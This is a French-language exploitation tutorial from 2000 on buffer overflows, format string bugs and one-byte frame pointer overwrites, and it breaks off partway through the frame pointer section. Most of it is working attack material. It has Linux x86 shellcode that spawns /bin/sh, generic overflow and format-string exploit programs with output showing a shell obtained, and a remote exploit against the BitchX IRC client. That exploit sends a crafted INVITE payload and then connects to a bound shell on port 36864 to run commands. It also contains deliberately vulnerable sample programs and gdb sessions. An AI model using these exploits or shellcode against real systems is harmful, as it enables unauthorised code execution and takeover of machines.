/***************************************************************************
                             Exploitation De Bugs
                              (Texte Version 5)
                             --------------------
    begin                : 14/09 2000
    copyright            : (C) 2000 by Anti-Social
    email                : anti-social@usa.com
    site                 : www.nether.net/~lionel56
 ***************************************************************************/

/* Ce texte est l'aide aux programmes: ScanS & ScanB */

1- Explication des différents bugs
___________________________________

a- Buffer Overflow
==================
( buffer == espace dans la memoire ) 
( overflow == depassement ) 
( buffer overflow == dépassement d'espace mémoire )
Le but est de réinscrire le RET pour le modifier par un autre qui pointera sur
une autre adresse desirée (par exemple celle d'un shellcode).Toutes methodes
d'overflow reposent sur ce concept! 
schema:
-------

buffer intact:          [buffer][RET] 
taille:                     10     8
buffer apres overflows:  [   buffer  ] 

[buffer] == l'espace memoire 

[RET] == l'adresse qui va pointer sur la prochaine fonction (qui suit celle du
remplissage du buffer)

[  buffer  ] == Apres le buffer overflow, nous ecrivons sur le RET ,
puisque il y a dans le buffer 18 caractères. Donc nous pouvons mettre
n'importe quelle adresse qui sera contenu sur les 8 derniers octets.

/* (1octet = 8 bits)
 (8bits = 2^8 = 256 ) */

Buffer apres overflow:
                         [AAAAAAAAAA\xbf\xff\xfc\x58*2]
/* on rentre 2 fois RET */
        Caractères sans importances | Nouvelle RET qui pointe vers un shell 
J'espere que vous aurez compris le principe , c'est super simple quand on
pige bien.

Generique sploit:
*****************
/* Anti-Social */
#define NOPS 100 /* taille du buffer */

char shellcode[]= /* OrganiKs shellcode */
        "\xeb\x16\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b"
        "\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";

int main()
{
char over[4096];
char ret[]="\xd0\xf8\xff\xbf"; /* RET addresse */
int i;
for(i=1;i<NOPS-sizeof(shellcode);i++) strcat(over,"\x90");
strcat(over,shellcode);
strcat(over,ret);
strcat(over,ret);
execl("./prog","prog",over,0x0);
}                           
/* FIN */

Astuce:
*******
Pour obtenir RET facilement, pour cela il faut connaitre le nom du buffer que
l'on va déborder. 
Exemple:
main(...){
char buffer[100];
...
}
compile avec l'option -g
gdb -q prog
(gdb)break main
(gdb)run `perl -e 'print "A" x 108'` /* 108 * A => 100 = taille du buffer
                                      *  + 8 = RET * 2
                                      */
(gdb)print &buffer
$1 = (char (*)[100]) 0xbffff734
---------------------  
Donc RET = 0xbffff734
---------------------

Pourquoi on met 2 * RET ?
Parce que en faite:
[RET] => [1er ADDRESSE][2EME ADRESSE]
La première adresse pointe sur la 2�me
Et la 2�me call sur "les trucs à executer".
En faite dans le cas d'un buffer overflow 
on pourrait mettre 4NOPS en plus et virer
1 adresse RET car si on reinscrit directe 
la 2�me plus besion de la premiere...
Schema de se qui se passe:
RET1 => RET2 => execute
SI RET1 = 0x41414141
Il va aller chercher RET2 � 0x41414141
ET si RET2 etait bien � 0x41414141 et 
que son adresse soit l'adresse d'un shellcode
, il pointerait dessus et le shellcode serait 
executer.Cela sert pour le frame pointer overflow 
d'un byte.

a- Probleme de collage de buffer
================================

Ce problème est à mon avis très rare car il serait vite repéré.

/* Anti-Social */ 
/* Pb collage buff 1 */
#include <stdio.h>

void bou(char *bou){
char buf[24];
strcpy(buf,bou);
printf("%s\nbuf);
}

main(int argc, char *argv[]){

char buf2[24];
char buf3[12];
sprintf(buf3,"BBBBBBBBBBBB");
snprintf(buf2,24,"%s",argv[1]);
bou(buf3);
}
/* FIN */

$./teste1 `perl -e 'print "A" x 11'`
BBBBBBBBBBBBAAAAAAAAAAA
$./teste1 `perl -e 'print "A" x 12'`
Erreur de segmentation 

/* Anti-Social */ 
/* Pb collage buff 2 */
#include <stdio.h>

void bou(char *bou){
char buf[8];
strcpy(buf,bou);
printf("%s",buf);
}

main(int argc, char *argv[]){

char buf2[16];
char buf3[8];
fgets(buf2, 16, stdin);
strncpy(buf3, buf2, 8);
bou(buf3);
}
/* FIN */*

$./teste2
AAAAAA
AAAAAA 
$./test2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Erreur de segmentation

c- Format Bugs
==============

Ce bug est tres tres con mais fallait le trouver, et c'est Lamagra qui la
trouvé apparemment...
Les fonctions vulnérables par ce bug:
printf();
snprintf();
vsnprintf();
peut être d'autre...
Voici des exemples de codes vulnérable:

/* hole1.c */
/* Anti-Social */
main(int argc,char **argv)
{  
    char buf[16];
    strncpy(buf,argv[1],16); 
    printf(buf); 
    putchar('\n');
}
/* FIN*/

/* hole2.c */
/* Anti-Social */
main(int argc,char **argv)
{  
    char buf[16];
    snprintf(buf,argv[1],16); 
    printf("%s\n",buf); 
}
/* FIN*/

/* hole3.c */
/* Anti-Social */
main(int argc,char **argv)
{  
    char buf[16];
    vsnprintf(buf,argv[1],16); 
    printf("%s\n",buf); 
}
/* FIN*/

Ces 3 programmes test donnent le même résultat:
$./hole* AAAA%p
AAAA0x41414141

Cette exemple devrait vous ouvrir les yeux, en faite le truc qui ce passe,
c'est que le printf marche comme cela:

              
         Format String   Expressions
              ^              ^ 
        _______________ ___________
        |             | |         |
printf( "bla bla %s %p" ,bla ,&bla );

Les %s , %p , ... sont des indicateurs.
Les autres: %c , %x , %X , %d , %n , %f , %i , %u , %e , %E , %g , %G , %o ,...

Pour exploiter cette faille il faut bien comprendre le principe, mais en faite
c'est tres tres simple, et les possibilités sont extraordinaire.
Grâce à ce bug on peut réecrire une adresse.Par exemple on peut réinscrire
un registre (%eip, %esp, ...).

Pour cela, il suffi de faire:
\x10\xfb\xff\xbf%p%n

%p va print la première adresse.
%n rentre l'adresse print par %p  dans 0xbfffbf10.

example:
--------
/* Example1.c */
/* Anti-Social */
main(int argc,char **argv)
{  
    char buf[1024];  
    char sux[32];
    snprintf(buf,1024,argv[1]);
    printf("So:%s\n",buf);
}
/* FIN */

$./example1 AAAA%p%p%p%p%p%p%p%p%p
So:AAAA(nil)0x8048240(nil)0x10x400006300xbffff4180x400073b50x400150000x41414141 
On vois que un adresse 0x41414141 (donn�e par AAAA[argv]) est � la position:
"%p%p%p%p%p%p%p%p%p".
$gdb -q ./example1
(gdb) disassemble main
Dump of assembler code for function main:
0x8048340 <main>:       push   %ebp
0x8048341 <main+1>:     mov    %esp,%ebp
0x8048343 <main+3>:     sub    $0x420,%esp
0x8048349 <main+9>:     mov    0xc(%ebp),%eax
0x804834c <main+12>:    add    $0x4,%eax
0x804834f <main+15>:    mov    (%eax),%edx
0x8048351 <main+17>:    push   %edx
0x8048352 <main+18>:    push   $0x400
0x8048357 <main+23>:    lea    0xfffffc00(%ebp),%eax
0x804835d <main+29>:    push   %eax
0x804835e <main+30>:    call   0x80482b4 <snprintf>
0x8048363 <main+35>:    add    $0xc,%esp
0x8048366 <main+38>:    lea    0xfffffc00(%ebp),%eax
0x804836c <main+44>:    push   %eax
0x804836d <main+45>:    push   $0x80483dc
0x8048372 <main+50>:    call   0x80482a4 <printf>
0x8048377 <main+55>:    add    $0x8,%esp
0x804837a <main+58>:    mov    %ebp,%esp
0x804837c <main+60>:    pop    %ebp
0x804837d <main+61>:    ret
End of assembler dump.    
(gdb) break *0x804835e
Breakpoint 1 at 0x804835e: file example.c, line 29.
(gdb) break *0x8048363
Breakpoint 2 at 0x8048363: file example.c, line 29.   
  (gdb) r
Starting program: ./example1
print &sux
Breakpoint 1, 0x804835e in main (argc=1, argv=0xbffff894) at example1.c:29
29          snprintf(buf,1024,argv[1]);
(gdb) print &sux
$1 = (char (*)[32]) 0xbffff428  
(gdb) r AAAA\x28\xf4\xff\xbf%p%p%p%p%p%p%p%p%p%n
The program being debugged has been started already.
Start it from the beginning? (y or n) y
 
Starting program: ./example1 AAAA\x28\xf4\xff\xbf%p%p%p%p%p%p%p%p%p%n
 
Breakpoint 1, 0x804835e in main (argc=2, argv=0xbffff874) at example1.c:29
29          snprintf(buf,1024,argv[1]); 
(gdb) x 0xbffff428
0xbffff428:     0x0000a911   
(gdb) c
Continuing.
 
Program received signal SIGSEGV, Segmentation fault.
0x400672d0 in _IO_vfprintf (s=0xbffff2f4,
    format=0xbffff9e0 "AAAAx28xf4xffxbf%p%p%p%p%p%p%p%p%p%n", ap=0xbffff430)
    at vfprintf.c:1212
(gdb) x 0xbffff428
0xbffff428:     0x41414141
(gdb)                                        

Autre probleme exploitable grace à cette technique:
/* protection_b00m => 8.c */
/* Anti-Social */
#include <stdio.h>

int main(char *argc,char **argv)
{
char buf[24];
if(strlen(argv[1])<sizeof(buf)){
sprintf(buf,argv[1]);
printf("OVERFLOWWWW!!!!\n");
}
else{
printf("Vilain gar�on...\n");
}
}
/* FIN */

$./8 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Vilain gar�on...
$./8 %.200d
Erreur de segmentation
/* %.200d => produit 200 x "0" */
$gdb -q ./8t
(gdb) r %.24dAAAAAAAA
Starting program: ./8 %.24dAAAAAAAA
OVERFLOWWWW
 
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()           
(gdb) info reg
eax            0xc      12
ecx            0x401147c0       1074874304
edx            0xc      12
ebx            0x40115ff8       1074880504
esp            0xbffff830       0xbffff830
ebp            0x41414130       0x41414130
esi            0x4000ac70       1073785968
edi            0xbffff874       -1073743756
eip            0x41414141       0x41414141
eflags         0x10292  66194
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x0      0
(gdb)           

Il sufit de mettre dans le buffer:
[                          b  u  f  f  e  r                                 ]
[shellcode][%.taille_du_buffer-shell_coded][RET_qui_pointe_sur_le_shell_code]

Tadaaaaaaa!!!! C'est super simple...
Bonne chance et encore merci lamagra!

Exemple d'exploitation plus complexe:
-------------------------------------
Plusieurs choix s'offrent pour l'exploitation, tout depend de la fonction
contenant le bug...
Si c'est un sprintf(voir methode plus haut), si c'est un snprintf il va
falloir faire un exploit petit. Pour des fonctions comme printf , syslog , on
s'en fou de la taille...
Mais il est preferable d'ecrire son exploit ainsi:

/* Anti-Social */
/* Format Bug */
/* exp.c */
#define NOPs 110 /* nombre de nop(\x90) */
#define EAT 5 /* nombre de %08x */
#define HIGH1 0x54 /* 0x54 */
#define HIGH2 0xf2 /* 0xf254 */
#define LOW1 0xff  /* 0xfff254 */
#define LOW2 0x1bf /* 0xbffff254 = adresse qui pointe sur shellcode */
void main() 
{ 
  char a1[100]; 
  char a2[100]; 
  char a3[100]; 
  char a4[100]; 
  char x[100]; 
  char nop[1024]; 

  int i;
 
  char egg[] = /* Shellcode */
	"\xeb\x16\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b"    
	"\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh";

  memset(nop, 0, 100); /* Remplit de zero => nop */
  memset(a1, 0, 100);  /* Remplit de zero => a1 */
  memset(a2, 0, 100);  /* Remplit de zero => a2 */
  memset(a3, 0, 100);  /* Remplit de zero => a3 */
  memset(a4, 0, 100);  /* Remplit de zero => a4 */
  memset(x, 0, 100);   /* Remplit de zero => x  */
 
  for (i=0; i < NOPs ; i++) /* 80 * 0x90 */ 
  { 
    strcat(nop, "\x90"); 
  }

   for (i=0; i < EAT ; i++) /* 5 * %08x */ 
  { 
    strcat(x, "%08x"); 
  }

  sprintf(a1, "%%%dd", HIGH1 - 16 - 8*EAT - 4*3); 
  /* 
   * a1 = 0x64 - 16(adresse 0xbffff01c-1f) - 8*EAT(5*%08x) - 4*3(AAAA*3)
   */
  sprintf(a2, "%%%dd", HIGH2 - HIGH1 );
  sprintf(a3, "%%%dd", LOW1 - HIGH2  );
  sprintf(a4, "%%%dd", LOW2 - LOW1 );

  printf(
	"\x1c\xf0\xff\xbf"  /* 1st addr (RET) */
        "AAAA"              /* %d printf vide */
        "\x1d\xf0\xff\xbf"  /* 2nd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x1e\xf0\xff\xbf"  /* 3rd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x1f\xf0\xff\xbf"  /* 4th addr (RET) */ 
        "%s"                /* EAT*%08x */
        "%s%%hn"            /* copy 1 0xbffff01c => 0x64 */
        "%s%%hn"            /* copy 2 0xbffff01d => 0xf2 */ 
        "%s%%hn"            /* copy 3 0xbffff01e => 0xff */ 
        "%s%%hn%s%s"        /* copy 4 0xbffff01f => 0xbf */ 
        , x, a1, a2, a3, a4, nop, egg); 
} 
/* FIN */

Comment le configurer?
----------------------
Les variables qui change sont:
EAT , HIGH1 , HIGH2 , LOW1 , LOW2 , l'adresse RET (au niveau du printf).
Exemple:
./ff est vulnerable � ce bug:
$./ff
AAAA%08p%08p%08p%08p%08p%08p%08p%08p
AAAA0x400140d00x40115ff80xbffff8280x80484080xbffff0280xbffff4280x414141410x30347830 
$
On rep�re 0x41414141 � la 7�me position ( 7*%08p = 0x41414141 ).
On regarde les adresses:
0x80484080xbffff0280xbffff4280x41414141
Les plus interessantes sont juste avant 0x41414141...
On peut voir 0x80484080 = fontion appell� par RET => EIP
Nous voulons r�ecrire cette adresse par une autre...Pour 
cela il faut trouver RET , 2 moyen GDB ou on la devine par
ces adresses.
0x8048408
0xbffff028 /* pour trouver RET */
0xbffff428 /* pour trouver l'adresse qui pointe sur notre shellcode */
0x41414141
Pour ma part j'ai remarqu� que l'adresse qui suit 0x8048408 
peut nous servire � trouver RET:
0xbffff028 - 0x10 + 0x04 = 0xbffff01c = RET
Pour le buffer cela est un peut plus chiant:
/* sachant que le buffer est = 1024 = 0x400 */
0xbffff428 - 0x400 + 0x14 = 0xbffff03c
/* 0xbffff03c = environ l'adresse du commmencement du buffer */
Biensur le shellcode sera pas au debut du buffer...
Mais vue que les %..d sont variable selon l'adresse, 
nous devons mettre des NOPs.
Calcule de ou se situra environ le shellcode:
16(adresse 0xbffff01c-1f) + 40(8*5[%08x]) + 12(AAAA*3) = 68
%..d*4 = maximum 1020

/* normalement 0x3c mais 0x44 est plus grand donc on fait + 0x10
 * jusqu'a que ca sois plus grand...
 */
0x4c - 0x44(68) = 0x08 = 8
0xf0 - 0x4c     = 0xa4 = 164
0xff  - 0xf0    = 0x0f = 15
0x1bf - 0xff    = 0xC0 = 192
total %..d = 379  
TOTAL RET_sh = 379+68 = 447 = 0x1bf

0xbffff03c + 0x1bf = 0xbffff1fb = RET_sh !!@@!!

Verif les calcules avec le nouveau RET:
0xfb - 0x44(68)
0xf1 - 0xfb /* ca passe pas ici!! */    
0xff  - 0xf1   
0x1bf - 0xff   
Vu que l'adresse ne passe pas, il faut l'augmenter car on ne peut pas
la baisser sinon on arrivera sur les %..d.

0xbfff1fb => obligé d'augmenter 0xf1 de 0x01 donc:
0xbfff200 /* on enleve les 0xfb car sinon on arrive trop loin */
Re calcule:
0x00 - 0x44(68) /* ca passe pas ici!! */  
0xf2 - 0x00    
0xff  - 0xf2 
0x1bf - 0xff   

Donc obligé d'augmenter 0x00 => 0x54 (ajout de 0x10):
0x54 - 0x44(68) 
0xf2 - 0x54    
0xff  - 0xf2
0x1bf - 0xff 

Ca passe !!! Mais on va aller plus loin dans la chaine donc
il va faloire ajouter des NOPs:
0xbffff254 - 0xbffff1fb = 0x59 = 89 NOPs
Pour le cas ou ca passerai un peu plus loin on va en mettre 110!
$( ./exp ; cat ) | ./ff        
id
uid=500(Anti-Social) gid=100(users) groups=100(users)
$
Voila voila... C'est pas si complexe que ca...

Un grand merci à Kalou qui ma bien aidé!!
BONUS:
------
/* PAS encore fini*/
/* Anti-Social */
/* BX exploit for Suse 6.3 BitchX 75 p1 */
/* Thx to: Kalou & Hegemoon & Lamagra */
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h> 
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define NOPs 120 /* nombre de nop(\x90) */
#define EAT 44 /* nombre de %08x (44 or 43) */
#define HIGH1 0x1d0 /* 0x177 */
#define HIGH2 0x1e1 /* 0xf1bf */
#define LOW1 0x2ff  /* 0xfff1bf */
#define LOW2 0x3bf /* 0xbffff1bf = adresse qui pointe sur shellcode */

char egg[]=
/* main: */
"\xeb\x1d"                                /* jmp callz               */
/* start: */
"\x5e"                                    /* popl %esi               */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x88\x46\x08"                            /* movb %al, 0x07(%esi)    */
"\x89\x46\x0c"                            /* movl %eax, 0x0c(%esi)   */
"\x89\x76\x08"                            /* movl %esi, 0x08(%esi)   */
"\xb0\x0b"                                /* movb $0x0b, %al         */
"\x87\xf3"                                /* xchgl %esi, %ebx        */
"\x8d\x4b\x08"                            /* leal 0x08(%ebx), %ecx   */
"\x8d\x53\x0c"                            /* leal 0x0c(%ebx), %edx   */
"\xcd\x80"                                /* int $0x80               */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x40"                                    /* incl %eax               */
"\xcd\x80"                                /* int $0x80               */
/* callz: */
"\xe8\xde\xff\xff\xff"                    /* call start              */
"/bin/sh";

void prise(int leesock);
int connect_tcp(struct in_addr addr,unsigned short port);
int fdprintf(int dafd,char *fmt,...);
struct in_addr victim;
struct in_addr ip;

int main (int argc,char **argv)
{
char recvbuf[1024];
int sockfd;
int i; 
  char a1[100]; 
  char a2[100]; 
  char a3[100]; 
  char a4[100]; 
  char x[1024]; 
  char nop[1024]; 

printf("Anti-Social\n");
printf("Exploit BitchX Baby!\n");

  memset(nop, 0, 1024);/* Remplit de zero => nop */
  memset(a1, 0, 100);  /* Remplit de zero => a1 */
  memset(a2, 0, 100);  /* Remplit de zero => a2 */
  memset(a3, 0, 100);  /* Remplit de zero => a3 */
  memset(a4, 0, 100);  /* Remplit de zero => a4 */
  memset(x, 0, 1024);   /* Remplit de zero => x  */


if (argc != 4)
{
  printf("Usage: %s <irc> <nick> <ip>\n",argv[0]);
  exit(0);
}

  for (i=0; i < NOPs ; i++) /* 80 * 0x90 */ 
  { 
    strcat(nop, "\x90"); 
  }

   for (i=0; i < EAT ; i++) /* 5 * %08x */ 
  { 
    strcat(x, "%08x"); 
  }


  sprintf(a1, "%%%dd", HIGH1 - 16 - 8*EAT - 4*3 - 3); 
  /* 
   * a1 = 0x64 - 16(adresse 0xbffff01c-1f) - 8*EAT(5*%08x) - 4*3(AAAA*3)
   */
  sprintf(a2, "%%%dd", HIGH2 - HIGH1 );
  sprintf(a3, "%%%dd", LOW1 - HIGH2  );
  sprintf(a4, "%%%dd", LOW2 - LOW1 );

if (!host_to_ip(argv[1],&victim))
{
  fprintf(stderr,"Erreur de resolution hostname\n");
  exit(0);
}
if (!host_to_ip(argv[3],&ip))
{
  fprintf(stderr,"Erreur de resolution hostname\n");
  exit(0);
}

if ((sockfd=connect_tcp(victim,6667)) < 0)
{
  printf("service irc close\n");
  exit(-1);
}
else{
  printf("service irc open\n");
  sleep(2);
  fdprintf(sockfd,"nick zerma\r\n");
  sleep(1);
  fdprintf(sockfd,"user zerma zerma zerma : zerma\r\n");
  sleep(5);
  fdprintf(sockfd,"INVITE %s #AA"
         /* #aa ou #aaa */
/* 
0xbfffee94  or 0xbfffeea4
*/
	"\x9c\xee\xff\xbf"  /* 1st addr (RET) */
        "AAAA"              /* %d printf vide */
        "\x9b\xee\xff\xbf"  /* 2nd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x9d\xee\xff\xbf"  /* 3rd addr (RET) */ 
        "AAAA"              /* %d printf vide */
        "\x9e\xee\xff\xbf"  /* 4th addr (RET) */ 
        "%s"                /* EAT*%08x */
        "%s%%hn"            /* copy 1 0xbffff01c => 0x64 */
        "%s%%hn"            /* copy 2 0xbffff01d => 0xf2 */ 
        "%s%%hn"            /* copy 3 0xbffff01e => 0xff */ 
        "%s%%hn%s%s\r\n"    /* copy 4 0xbffff01f => 0xbf */ 
        , argv[2], x, a1, a2, a3, a4, nop, egg); 
sleep(2);
}
printf("Connection sur ip de %s port 36864...\n",argv[2]);
sleep(5);
if ((sockfd=connect_tcp(ip,36864)) < 0)
{
  printf("Exploit failled!! :(\n");
  exit(-1);
}
else{
printf("Ok !!!@@@!!! :o)\n");
fdprintf(sockfd,"id;uname -a:pwd\n");
prise(sockfd);
}
}
/* prise de connection */

void prise(int lesock)
{
int n;
char recvbuf[1024];
fd_set rset;

while (1)
{
  FD_ZERO(&rset);
  FD_SET(lesock,&rset);
  FD_SET(STDIN_FILENO,&rset);
  select(lesock+1,&rset,NULL,NULL,NULL);
  if (FD_ISSET(lesock,&rset))
  {
    n=read(lesock,recvbuf,1024);
    if (n <= 0)
    {
      printf("Connection ferm�e\n");
      exit(0);
    }
    recvbuf[n]=0;
    printf("%s",recvbuf);      
  }
  if (FD_ISSET(STDIN_FILENO,&rset))
  {
    n=read(STDIN_FILENO,recvbuf,1024);
    if (n>0)
    {
      recvbuf[n]=0;
      write(lesock,recvbuf,n);
    }
  }
}
}

/* ecrit dans une connection */

int fdprintf(int dafd,char *fmt,...)
{
char mybuffer[4096];
va_list va;

va_start(va,fmt);
vsnprintf(mybuffer,4096,fmt,va);
write(dafd,mybuffer,strlen(mybuffer));
va_end(va);
return(1);
}

/* connextion tcp usage: host port */

int connect_tcp(struct in_addr addr,unsigned short port)
{
struct sockaddr_in serv;
int thesock,flags;

thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
bzero(&serv,sizeof(serv));
memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
serv.sin_port=htons(port);
serv.sin_family=AF_INET;
if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
  return(-1);
else
  return(thesock);
}

/* gethostname */
int host_to_ip(char *hostname,struct in_addr *addr)
{
struct hostent *res;

res=gethostbyname(hostname);
if (res==NULL)
  return(0);
memcpy((char *)addr,res->h_addr,res->h_length);
return(1);
}
/* EOF */ 

d- Frame pointer
================

Cette methode a été trouvé par Klog.
Il s'agit d'overflow un "frame pointer".
Cette méthode paru dans phrack55 ecrit par klog. En effet je mettais gourée
car j'avais confondu bytes et bits... Donc excuse moi klog... :p

En fait la methode est un overflow normale mais dans ce cas on ne peut alterer
le RET1 que d'un octet (ret1 = frame pointer).
Normalement un overflow:
[NOPS+SHELLCODE = taille du buffer à overflow][RET * 2]
Ici:
[NOPS+SHELLCODE+RET=taille du buffer à overflow][alteration d'un octet"\xyy"]
[RET1]=>[RET2]=>[SHELLCODE]
Si RET1 pointait normalement il pointerai juste apres lui donc +8 apres
la fin du buffer ca veut dire que si on overflow d'un octet on peut pointer
ou on veut dans la fin de notre buffer , il suffit de mettre l'adresse RET2
dans notre buffer que RET1 pointera car overflow d'un octet et que RET2
repointe sur le debut de notre buffer, et le tour est joué!

Le mieux pour comprendre est un example:

/* Frame Pointer => 9.c */
/* Anti-Social */
#include <stdio.h>
main(int argc, char *argv[]){
foo(argv[1]);     
}
foo(char *over){
char buffer[256];
int i;
for(i=0;over[i];i++)
buffer[i]=over[i]; 
}
/* FIN */
$cc -g -o 9 9.c
$gdb -q 9
(gdb) disassemble main
Dump of assembler code for function main:
0x80482d0 <main>:       push   %ebp
0x80482d1 <main+1>:     mov    %esp,%ebp
0x80482d3 <main+3>:     mov    0xc(%ebp),%eax
0x80482d6 <main+6>:     add    $0x4,%eax
0x80482d9 <main+9>:     mov    (%eax),%edx
0x80482db <main+11>:    push   %edx
0x80482dc <main+12>:    call   0x80482f0 <foo>
0x80482e1 <main+17>:    add    $0x4,%esp
0x80482e4 <main+20>:    mov    %ebp,%esp
0x80482e6 <main+22>:    pop    %ebp
0x80482e7 <main+23>:    ret
0x80482e8 <main+24>:    nop
0x80482e9 <main+25>:    lea    0x0(%esi,1),%esi
End of assembler dump.                           
(gdb) disassemble foo
Dump of assembler code for function foo:
0x80482f0 <foo>:        push   %ebp
0x80482f1 <foo+1>:      mov    %esp,%ebp
0x80482f3 <foo+3>:      sub    $0x104,%esp
0x80482f9 <foo+9>:      nop
0x80482fa <foo+10>:     movl   $0x0,0xfffffefc(%ebp)
0x8048304 <foo+20>:     mov    0x8(%ebp),%eax
0x8048307 <foo+23>:     add    0xfffffefc(%ebp),%eax
0x804830d <foo+29>:     cmpb   $0x0,(%eax)
0x8048310 <foo+32>:     jne    0x8048320 <foo+48>
0x8048312 <foo+34>:     jmp    0x8048350 <foo+96>
0x8048314 <foo+36>:     lea    0x0(%esi),%esi
0x804831a <foo+42>:     lea    0x0(%edi),%edi
0x8048320 <foo+48>:     lea    0xffffff00(%ebp),%edx
0x8048326 <foo+54>:     mov    %edx,%eax
0x8048328 <foo+56>:     add    0xfffffefc(%ebp),%eax
0x804832e <foo+62>:     mov    0x8(%ebp),%edx
0x8048331 <foo+65>:     add    0xfffffefc(%ebp),%edx
0x8048337 <foo+71>:     mov    (%edx),%cl
0x8048339 <foo+73>:     mov    %cl,(%eax)
0x804833b <foo+75>:     incl   0xfffffefc(%ebp)
0x8048341 <foo+81>:     jmp    0x8048304 <foo+20>
0x8048343 <foo+83>:     lea    0x0(%esi),%esi
0x8048349 <foo+89>:     lea    0x0(%edi,1),%edi
0x8048350 <foo+96>:     mov    %ebp,%esp
0x8048352 <foo+98>:     pop    %ebp
0x8048353 <foo+99>:     ret
End of assembler dump.  
(gdb) break *0x8048352
Breakpoint 1 at 0x8048352: file 9.c, line 10.
(gdb) break *0x8048353
Breakpoint 2 at 0x8048353: file 9.c, line 10.
(gdb) break *0x80482e6
Breakpoint 3 at 0x80482e6: file 9.c, line 4.
(gdb) break *0x80482e7
Breakpoint 4 at 0x80482e7: file 9.c, line 4.      
(gdb) r `perl -e 'printf "A"x257'`
Starting program: ./9 `perl -e 'printf "A"x257'`
 
Breakpoint 1, 0x8048352 in foo (over=0xbffff903 'A' <repeats 200 times>...)
    at 9.c:10
10      } 
(gdb) c
Continuing.
 
Breakpoint 2, 0x8048353 in foo (
    over=0x13bffff7 <Address 0x13bffff7 out of bounds>) at 9.c:10
10      }
(gdb) info reg ebp
ebp            0xbffff741       0xbffff741
(gdb) info reg esp
esp            0xbffff740       0xbffff740
(gdb) c
Continuing.
 
Breakpoint 3, 0x80482e6 in main (argc=331350007, argv=0x2400383) at 9.c:4
4       }
(gdb) info reg ebp
ebp            0xbffff741       0xbffff741
(gdb) info reg esp
esp            0xbffff741       0xbffff741    
(gdb) c
Continuing.
 
Breakpoint 4, 0x80482e7 in main (argc=
Cannot access memory at address 0x308048a.
) at 9.c:4
4       }
(gdb) info reg esp
esp            0xbffff745       0xbffff745
(gdb) x/wx 0xbffff745
0xbffff745:     0x68bffff9    
(gdb) c
Continuing.
 
Program received signal SIGSEGV, Segmentation fault.
0x68bffff9 in ?? ()   

/*
 * Ici on run le programmme avec 257 x A donc le buffer overflow
 * et le dernier des caractères à copier se retrouve sur %ebp
 * qui celui-ci va se copier dans %esp puis l'adresse contenue
 * dans son pointer (ici = 0x68bffff9) va sur %eip .
 */

/*
 * Pour verifier que c'est bien nous qui alterons le dernier octet,
 * nous allons lancer le programme avec B (0x42 * 257) .
 */

(gdb) r `perl -e 'printf "B"x257'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: ./9 `perl -e 'printf "B"x257'`

Breakpoint 1, 0x8048352 in foo (over=0xbffff903 'B' <repeats 200 times>...)
    at 9.c:10
10      }
(gdb) c
Continuing.

Breakpoint 2, 0x8048353 in foo (over=0x8313bfff "") at 9.c:10
10      }
(gdb) info reg esp
esp            0xbffff740       0xbffff740
(gdb) info reg ebp
ebp            0xbffff742       0xbffff742
(gdb) c
Continuing.
 
Breakpoint 3, 0x80482e6 in main (argc=-2095857665, argv=0x24003) at 9.c:4
4       }
(gdb) info reg esp
esp            0xbffff742       0xbffff742
(gdb) info reg ebp
ebp            0xbffff742       0xbffff742
(gdb) c
Continuing.
 
Breakpoint 4, 0x80482e7 in main (argc=
Cannot access memory at address 0xf903080c.
) at 9.c:4
4       }
(gdb) info reg esp
esp            0xbffff746       0xbffff746
(gdb) info reg ebp
ebp            0xf9030804       0xf9030804
(gdb) x/wx 0xbffff746
0xbffff746:     0xf768bfff 
(gdb) c
Continuing.
 
Program received signal SIGSEGV, Segmentation fault.
0xf768bfff in ?? ()                      

/*
 * Ok donc c'est bien nous donc maintenant comment modifier
 * l'adresse que pointe notre adresse modifiée par 1octet?
 */

/* 
 * Ca deviens un tout petit plus compliqué à comprendre.
 * En faite il suffie de trouver une adresse qui pointe
 * sur la fin de notre buffer (over) mais pas tout à fait
 * sur la fin en faite sizeof(over) - 1 car le dernier octet
 * qui se trouve dans notre buffer est celui qui altère 
 * %ebp sur 1octet.
 * A ce moment il va se passer que cette adresse contiendra
 * une autre adresse qui pointera sur notre shellcode.
 * En faite l'adresse que nous allons trouver sera en 
 * : 0xbffff7** car nous pouvont modif que cette partie
 * de %ebp. 
 * [0xbffff7**] => pointe sur un parti de notre buffer,
 * � cette endroit ce trouve une autre adresse [0x********]
 * ([0x********] cette adresse est emise par nous sur le buffer)
 * qui pointera sur notre shellcode.
 */
(gdb) x/wx 0xbffff725
0xbffff725:     0x42424242  
(gdb) x/wx 0xbffff735
0xbffff735:     0x42424242
(gdb) x/wx 0xbffff745
0xbffff745:     0x68bffff9    
(gdb) x/wx 0xbffff740
0xbffff740:     0x080482e1
(gdb) x/wx 0xbffff738
0xbffff738:     0x42424242
(gdb) x/wx 0xbffff739
0xbffff739:     0x42424242  

/* 
 * La fin de notre buffer est à : 0xbffff739
 * mais vu qu'il faut enlever 1octet, 
 * elle est egale à : 0xbffff738
 * Mais vue que vous avez du remarquer que
 * quand %ebp ce copi dans %esp , %esp est
 * egal à %ebp + 0x4 donc pour notre adresse
 * 0xbffff738 , nous allons prendre juste le dernier
 * octet (0x38) et nous allons lui enlever 0x4 ce qui 
 * donne 0x34 mais il faut enlever 0x4 encore pour
